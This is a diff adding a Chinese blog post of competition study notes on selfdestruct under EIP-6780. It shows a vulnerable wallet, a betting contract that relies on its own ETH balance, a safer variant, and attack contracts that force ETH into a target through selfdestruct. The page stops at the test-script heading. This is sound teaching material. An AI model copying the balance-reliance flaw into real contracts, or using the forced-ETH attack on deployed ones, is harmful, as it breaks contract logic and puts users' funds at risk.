@@ -1,0 +1,467 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <script>
+        (function () {
+            try {
+                var t = localStorage.getItem('february-theme');
+                if (t !== 'dark' && t !== 'light') {
+                    t = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+                }
+                document.documentElement.setAttribute('data-theme', t);
+                document.documentElement.style.colorScheme = t;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+            }
+        })();
+    </script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>区块链国赛笔记 23｜合约安全实验：selfdestruct 的版本边界 - 二月の档案室</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="二月, 博客, 技术, 分享, 记录, 学习, 分享, 记录, 档案室, 技术分享,  february, blog, technology, share, record, learn, share, record, archive, technology share,"> 
+    <meta name="description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,自毁实验很容易出现“交易成功但代码还在”的现象。先确认运行链的硬分叉规则，再解释测试结果。
+
+
+
+本文由个人备赛旧笔记整理，整理日期为 2026-11-03。命令、输出和测试记录属于当时的实验环境；,"> 
+    <meta name="author" content="Allureluoli"> 
+    <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="区块链国赛笔记 23｜合约安全实验：selfdestruct 的版本边界 - 二月の档案室"/>
+    <meta name="twitter:description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,自毁实验很容易出现“交易成功但代码还在”的现象。先确认运行链的硬分叉规则，再解释测试结果。
+
+
+
+本文由个人备赛旧笔记整理，整理日期为 2026-11-03。命令、输出和测试记录属于当时的实验环境；,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="二月の档案室"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="区块链国赛笔记 23｜合约安全实验：selfdestruct 的版本边界 - 二月の档案室"/>
+    <meta property="og:description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,自毁实验很容易出现“交易成功但代码还在”的现象。先确认运行链的硬分叉规则，再解释测试结果。
+
+
+
+本文由个人备赛旧笔记整理，整理日期为 2026-11-03。命令、输出和测试记录属于当时的实验环境；,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+<link rel="stylesheet" href="/css/february.css">
+
+    <meta name="theme-color" content="#faf9f5" />
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">二月の档案室</span>
+    <div id="loader"></div>
+    <div class="f-progress" id="f-progress" aria-hidden="true"></div>
+
+    
+<header class="f-dock" id="f-dock">
+    <a class="f-brand" href="/" aria-label="回到首页">
+        <img class="f-brand-avatar" src="/img/avatar.jpg" alt="Allureluoli" width="28" height="28">
+        <span class="f-brand-text">二月<em>FEBRUARY</em></span>
+    </a>
+
+    <nav class="f-dock-links" aria-label="主导航">
+        
+        <a href="/">首页</a>
+        
+        <a href="/categories/">分类</a>
+        
+        <a href="/tags/">标签</a>
+        
+        <a href="/archives/">归档</a>
+        
+        <a href="/about/">关于</a>
+        
+    </nav>
+
+    <div class="f-dock-actions">
+        
+
+        
+        <button class="f-dock-btn icon-play f-play-btn" id="f-play" type="button" title="播放 / 暂停" aria-label="播放或暂停音乐">
+            <svg class="f-play-ico--play" viewBox="0 0 24 24" aria-hidden="true"><path d="M8 5.5v13l11-6.5z" fill="currentColor"/></svg>
+            <svg class="f-play-ico--pause" viewBox="0 0 24 24" aria-hidden="true"><rect x="7" y="5.5" width="3.4" height="13" rx="1.2" fill="currentColor"/><rect x="13.6" y="5.5" width="3.4" height="13" rx="1.2" fill="currentColor"/></svg>
+        </button>
+        
+
+        <button class="f-dock-btn f-theme-btn" id="f-theme" type="button" title="切换深浅色" aria-label="切换深浅色">
+            <svg class="f-ico-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 13.2A8.5 8.5 0 1 1 10.8 3a7 7 0 1 0 10.2 10.2z" fill="currentColor"/></svg>
+            <svg class="f-ico-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.2" fill="currentColor"/><path d="M12 2.5v2.2M12 19.3v2.2M2.5 12h2.2M19.3 12h2.2M5.2 5.2l1.6 1.6M17.2 17.2l1.6 1.6M18.8 5.2l-1.6 1.6M6.8 17.2l-1.6 1.6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+        </button>
+
+        <button class="f-dock-btn f-dock-menu switchmenu" type="button" title="菜单" aria-label="打开菜单" aria-expanded="false">
+            <span aria-hidden="true"></span><span aria-hidden="true"></span>
+        </button>
+    </div>
+</header>
+
+    
+<div class="nav" id="f-menu" aria-hidden="true">
+    <div class="f-menu-inner">
+        <p class="f-menu-kicker"><span class="f-pulse"></span>NAVIGATION</p>
+
+        <ul id="menu-menu" class="menu">
+            
+            <li class="pview menu-item" style="--i:0">
+                <a href="/" title="首页">
+                    <span class="f-menu-num">01</span>
+                    <span class="f-menu-text">首页</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:1">
+                <a href="/categories/" title="分类">
+                    <span class="f-menu-num">02</span>
+                    <span class="f-menu-text">分类</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:2">
+                <a href="/tags/" title="标签">
+                    <span class="f-menu-num">03</span>
+                    <span class="f-menu-text">标签</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:3">
+                <a href="/archives/" title="归档">
+                    <span class="f-menu-num">04</span>
+                    <span class="f-menu-text">归档</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:4">
+                <a href="/about/" title="关于">
+                    <span class="f-menu-num">05</span>
+                    <span class="f-menu-text">关于</span>
+                </a>
+            </li>
+            
+        </ul>
+
+        <div class="hitokoto">
+            <span class="typed" id="hitokoto" data-st="true">「我不相信命运，且我将在醉生梦死中追寻真正的自我。」</span>
+        </div>
+
+        <p class="footerlinks">
+            
+            <a target="_blank" rel="noopener" href="https://x.com/DevilC1875" title="X" aria-label="X">X</a>
+            
+            <a target="_blank" rel="noopener" href="https://github.com/allureluoli/" title="GitHub" aria-label="GitHub">GitHub</a>
+            
+            <a href="weixin://dl/chat?moonfebruarymoon" title="微信" aria-label="微信">微信</a>
+            
+            <a href="mailto:3345483363@qq.com" title="Email" aria-label="Email">Email</a>
+            
+        </p>
+
+        <p id="copyright">
+            &copy; 2026 Allureluoli
+            <span>·</span> Powered by Hexo
+            <span>·</span> Theme Diaspora
+        </p>
+    </div>
+</div>
+
+
+    
+<div id="single" class="f-post">
+    
+<header class="f-post-hero" style="--f-cover:url('/img/cover.jpg')">
+    <div class="f-post-hero-bg"></div>
+    <div class="f-post-hero-veil"></div>
+    <div class="f-post-hero-inner">
+        <nav class="f-crumbs" aria-label="面包屑">
+            <a href="/">首页</a>
+            <span aria-hidden="true">/</span>
+            
+            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9B%BD%E8%B5%9B%E7%AC%94%E8%AE%B0/">区块链国赛笔记</a>
+            <span aria-hidden="true">/</span>
+            
+            <span class="f-crumb-cur">正文</span>
+        </nav>
+
+        <h1 class="f-post-title">区块链国赛笔记 23｜合约安全实验：selfdestruct 的版本边界</h1>
+
+        <div class="f-post-meta">
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="16" rx="3" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M3 10h18M8 3v4M16 3v4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                <time datetime="2026-11-03T15:30:00.000Z">2026-11-03</time>
+            </span>
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="8.5" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M12 7v5.2l3.2 2" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                24 min read
+            </span>
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 5h16M4 12h10M4 19h13" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                10.7k 字
+            </span>
+            
+            <a class="f-meta-item f-meta-cat" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9B%BD%E8%B5%9B%E7%AC%94%E8%AE%B0/">区块链国赛笔记</a>
+            
+        </div>
+
+        
+        <div class="f-post-tags">
+            
+            <a class="f-tag" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">#区块链</a>
+            
+            <a class="f-tag" href="/tags/%E5%9B%BD%E8%B5%9B%E5%A4%87%E8%B5%9B/">#国赛备赛</a>
+            
+            <a class="f-tag" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a>
+            
+        </div>
+        
+    </div>
+</header>
+
+
+    <div class="f-post-wrap">
+        <article class="f-post-main">
+            <div class="content markdown f-content">
+                <p>自毁实验很容易出现“交易成功但代码还在”的现象。先确认运行链的硬分叉规则，再解释测试结果。</p>
+<span id="more"></span>
+
+<blockquote>
+<p>本文由个人备赛旧笔记整理，整理日期为 2026-11-03。命令、输出和测试记录属于当时的实验环境；本文未重新搭建整套环境验证。</p>
+</blockquote>
+<h2 id="阅读前先确认"><a href="#阅读前先确认" class="headerlink" title="阅读前先确认"></a>阅读前先确认</h2><p>在采用 EIP-6780 的 EVM 上，已有合约通常不会因 selfdestruct 删除代码和存储；同一交易内创建并自毁的情况例外。旧实验中的删除代码断言不能直接移植。参考 <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-6780">EIP-6780</a>。</p>
+<h2 id="第二部分-3题-自毁专项"><a href="#第二部分-3题-自毁专项" class="headerlink" title="第二部分 3题 - 自毁专项"></a>第二部分 3题 - 自毁专项</h2><h3 id="测试的代码"><a href="#测试的代码" class="headerlink" title="测试的代码"></a>测试的代码</h3><p>SelfDestruct.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 包含自毁功能的钱包合约</span><br><span class="line"> * 演示自毁攻击的风险</span><br><span class="line"> */</span><br><span class="line">contract VulnerableWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public balance;</span><br><span class="line"></span><br><span class="line">    event Deposited(address indexed from, uint256 amount);</span><br><span class="line">    event Withdrawn(address indexed to, uint256 amount);</span><br><span class="line">    event Destroyed(address indexed by);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 存款函数</span><br><span class="line">     */</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send ETH&quot;);</span><br><span class="line">        balance += msg.value;</span><br><span class="line">        emit Deposited(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 提款函数 - 只有所有者可以调用</span><br><span class="line">     */</span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</span><br><span class="line">        require(amount &lt;= balance, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        balance -= amount;</span><br><span class="line">        payable(owner).transfer(amount);</span><br><span class="line">        emit Withdrawn(owner, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 自毁函数 - 存在安全风险</span><br><span class="line">     */</span><br><span class="line">    function destroy() external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can destroy&quot;);</span><br><span class="line">        emit Destroyed(msg.sender);</span><br><span class="line">        selfdestruct(payable(owner));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取合约信息</span><br><span class="line">     */</span><br><span class="line">    function getInfo() external view returns (address, uint256, uint256) &#123;</span><br><span class="line">        return (owner, balance, address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 接收ETH的回退函数 - 修复版本</span><br><span class="line">     */</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        // 直接在 receive 函数中处理存款逻辑</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send ETH&quot;);</span><br><span class="line">        balance += msg.value;</span><br><span class="line">        emit Deposited(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>BalanceDependent.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.28;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 依赖余额逻辑的合约</span><br><span class="line"> * 演示自毁攻击如何破坏业务逻辑</span><br><span class="line"> */</span><br><span class="line">contract BalanceDependent &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public totalDeposits;</span><br><span class="line">    mapping(address =&gt; uint256) public deposits;</span><br><span class="line"></span><br><span class="line">    event GameStarted(address player, uint256 bet);</span><br><span class="line">    event Winner(address player, uint256 prize);</span><br><span class="line">    event ForcedETHReceived(uint256 amount);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 简单的赌博游戏</span><br><span class="line">     * 假设合约余额应该等于 totalDeposits</span><br><span class="line">     */</span><br><span class="line">    function playGame() external payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;Bet must be exactly 1 ETH&quot;);</span><br><span class="line">        require(address(this).balance &gt;= totalDeposits + msg.value, &quot;Balance inconsistency&quot;);</span><br><span class="line"></span><br><span class="line">        deposits[msg.sender] += msg.value;</span><br><span class="line">        totalDeposits += msg.value;</span><br><span class="line"></span><br><span class="line">        emit GameStarted(msg.sender, msg.value);</span><br><span class="line"></span><br><span class="line">        // 简单的随机逻辑（仅用于演示）</span><br><span class="line">        if (uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 2 == 0) &#123;</span><br><span class="line">            uint256 prize = 2 ether;</span><br><span class="line"></span><br><span class="line">            // 这里假设合约余额总是足够支付奖金</span><br><span class="line">            require(address(this).balance &gt;= prize, &quot;Insufficient contract balance&quot;);</span><br><span class="line"></span><br><span class="line">            payable(msg.sender).transfer(prize);</span><br><span class="line">            emit Winner(msg.sender, prize);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 检查合约状态</span><br><span class="line">     */</span><br><span class="line">    function checkState() external view returns (bool consistent, uint256 contractBalance, uint256 expectedBalance) &#123;</span><br><span class="line">        contractBalance = address(this).balance;</span><br><span class="line">        expectedBalance = totalDeposits;</span><br><span class="line">        consistent = (contractBalance == expectedBalance);</span><br><span class="line">        return (consistent, contractBalance, expectedBalance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 接收ETH - 但业务逻辑不希望直接接收ETH</span><br><span class="line">     */</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        // 自毁攻击可以绕过这个限制</span><br><span class="line">        emit ForcedETHReceived(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 提取资金（仅所有者）</span><br><span class="line">     */</span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</span><br><span class="line">        require(amount &lt;= address(this).balance, &quot;Insufficient balance&quot;);</span><br><span class="line">        payable(owner).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>SafeWallet.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 安全版本 - 避免自毁攻击的影响</span><br><span class="line"> */</span><br><span class="line">contract SafeWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 private _balance; // 使用内部状态跟踪余额</span><br><span class="line"></span><br><span class="line">    event Deposited(address indexed from, uint256 amount);</span><br><span class="line">    event Withdrawn(address indexed to, uint256 amount);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 存款 - 更新内部状态</span><br><span class="line">     */</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send ETH&quot;);</span><br><span class="line">        _balance += msg.value;</span><br><span class="line">        emit Deposited(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 提款 - 基于内部状态</span><br><span class="line">     */</span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);</span><br><span class="line">        require(amount &lt;= _balance, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        _balance -= amount;</span><br><span class="line">        payable(owner).transfer(amount);</span><br><span class="line">        emit Withdrawn(owner, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取余额 - 基于内部状态而不是 address(this).balance</span><br><span class="line">     */</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return _balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 检查状态一致性</span><br><span class="line">     */</span><br><span class="line">    function isStateConsistent() external view returns (bool) &#123;</span><br><span class="line">        return _balance == address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 安全的自毁函数 - 清空资金后自毁</span><br><span class="line">     */</span><br><span class="line">    function safeDestroy() external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner can destroy&quot;);</span><br><span class="line"></span><br><span class="line">        // 先转移所有资金</span><br><span class="line">        uint256 contractBalance = address(this).balance;</span><br><span class="line">        if (contractBalance &gt; 0) &#123;</span><br><span class="line">            payable(owner).transfer(contractBalance);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 然后自毁</span><br><span class="line">        selfdestruct(payable(owner));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 接收ETH - 直接更新内部状态</span><br><span class="line">     */</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send ETH&quot;);</span><br><span class="line">        _balance += msg.value;</span><br><span class="line">        emit Deposited(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击合约</p>
+<p>SelfDestructAttack.sol</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.28;</span><br><span class="line"></span><br><span class="line">import &quot;./SelfDestruct.sol&quot;;</span><br><span class="line"> contract SelfDestructAttack &#123;</span><br><span class="line">    address public attacker;</span><br><span class="line"></span><br><span class="line">    event AttackExecuted(address target, uint256 amount);</span><br><span class="line">    event FundsReceived(uint256 amount);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        attacker = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 执行自毁攻击</span><br><span class="line">     * 通过自毁强制向目标合约发送ETH</span><br><span class="line">     */</span><br><span class="line">    function attack(address payable target) external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send ETH for attack&quot;);</span><br><span class="line">        require(target != address(0), &quot;Invalid target&quot;);</span><br><span class="line"></span><br><span class="line">        // 通过自毁强制发送ETH</span><br><span class="line">        selfdestruct(target);</span><br><span class="line"></span><br><span class="line">        emit AttackExecuted(target, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 另一种攻击方式 - 创建并自毁临时合约</span><br><span class="line">     */</span><br><span class="line">    function attackViaCreation(address payable target) external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send ETH for attack&quot;);</span><br><span class="line"></span><br><span class="line">        // 创建临时攻击合约并立即自毁</span><br><span class="line">        TemporaryAttacker temp = new TemporaryAttacker&#123;value: msg.value&#125;(target);</span><br><span class="line"></span><br><span class="line">        emit AttackExecuted(target, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 接收ETH</span><br><span class="line">     */</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        emit FundsReceived(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 提取资金</span><br><span class="line">     */</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        require(msg.sender == attacker, &quot;Only attacker can withdraw&quot;);</span><br><span class="line">        payable(attacker).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 临时攻击合约 - 用于演示第二种攻击方式</span><br><span class="line"> */</span><br><span class="line">contract TemporaryAttacker &#123;</span><br><span class="line">    constructor(address payable target) payable &#123;</span><br><span class="line">        // 在构造函数中立即自毁，强制发送ETH</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试脚本</p>
